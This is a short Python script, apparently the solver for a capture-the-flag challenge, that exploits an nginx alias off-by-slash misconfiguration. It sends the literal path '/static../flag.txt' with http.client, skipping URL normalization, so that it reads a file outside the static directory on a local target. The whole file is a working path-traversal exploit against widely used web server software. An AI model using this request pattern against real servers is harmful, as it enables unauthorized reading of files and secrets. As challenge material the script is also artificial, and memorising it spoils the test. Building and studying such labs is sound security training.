"""nginx alias off-by-slash — read /var/www/flag.txt via /static../flag.txt.

Uses http.client directly because urllib.request and many HTTP libraries
normalize/collapse `..` segments client-side before sending. We need the
literal byte sequence `/static../flag.txt` to reach nginx for the alias-prefix
strip to land outside /var/www/static/.
"""
import http.client
import sys
from urllib.parse import urlparse


def solve(target: str = "http://127.0.0.1:8082") -> str:
    u = urlparse(target)
    conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=5)
    conn.request("GET", "/static../flag.txt")
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", errors="replace")
    conn.close()
    if resp.status != 200:
        raise SystemExit(f"unexpected status {resp.status}: {body}")
    return body


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8082"
    print(solve(target))
